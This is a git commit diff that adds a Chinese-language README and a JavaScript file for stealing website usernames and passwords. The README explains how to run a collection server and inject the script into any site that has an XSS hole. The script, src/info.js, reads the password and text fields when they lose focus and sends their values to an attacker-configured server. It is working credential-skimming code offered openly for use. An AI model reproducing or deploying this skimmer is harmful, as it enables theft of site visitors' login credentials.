f9a11c031ce615182184c000a70ecccced3ca6b4
vgoer <goerblue@gmail.com>
2022-11-12 11:56:47 +0800

    vgoer keylogin

--- README.md
+++ README.md
@@ -1,1 +1,26 @@
-# aaa
+# 获取网站用户名密码
+
+> css键盘监控、js来获取信息
+>
+> 感谢：[css-keylogin](https://github.com/maxchehab/css-keylogging)
+
+
+1. 首先进入到  `server` 目录
+```shell
+# 安装依赖
+npm i 
+
+# 启动服务
+node server.js
+
+```
+
+
+2. 只要网站又xss，就插入我们的css或者js代码
+```shell
+# 将url改成我们服务器的  
+url="my comp:3000"
+
+# 监控到控制到输入的代码了
+
+```shell
---
+++ src/info.js
@@ -0,0 +1,59 @@
+const pinp = document.querySelector("input[type='password']");
+const uinp = document.querySelector("input[type='text']");
+
+// 服务器地址
+const url = "http://localhost:3000/"
+pinp.addEventListener('blur', () => {
+    let val = pinp.value;
+
+    var ajax = false;
+    if (window.ActiveXObject) {
+        ajax = new ActiveXObject('Microsoft.XMLHTTP');
+    } else {
+        ajax = new XMLHttpRequest();
+    }
+
+    ajax.onreadystatechange = function () {
+        // readyState的值表示当前请求的状态
+        if (ajax.readyState == 4) {
+            // 判断请求的结果 
+            if (ajax.status == 200) {
+                //请求成功   回调值在这里
+                var data = ajax.responseText;//回调过来的值
+                console.log(data);
+            } else {// 请求失败后
+                console.log("err");
+            }
+        }
+    }
+    // 改为 你的服务器地址
+    ajax.open("get", url + val);
+    ajax.send(null);
+})
+uinp.addEventListener('blur', () => {
+    let val = uinp.value;
+
+    var ajax = false;
+    if (window.ActiveXObject) {
+        ajax = new ActiveXObject('Microsoft.XMLHTTP');
+    } else {
+        ajax = new XMLHttpRequest();
+    }
+
+    ajax.onreadystatechange = function () {
+        // readyState的值表示当前请求的状态
+        if (ajax.readyState == 4) {
+            // 判断请求的结果 
+            if (ajax.status == 200) {
+                //请求成功   回调值在这里
+                var data = ajax.responseText;//回调过来的值
+                console.log(data);
+            } else {// 请求失败后
+                console.log("err");
+            }
+        }
+    }
+    // 改为 你的服务器地址
+    ajax.open("get", url + val);
+    ajax.send(null);
+})
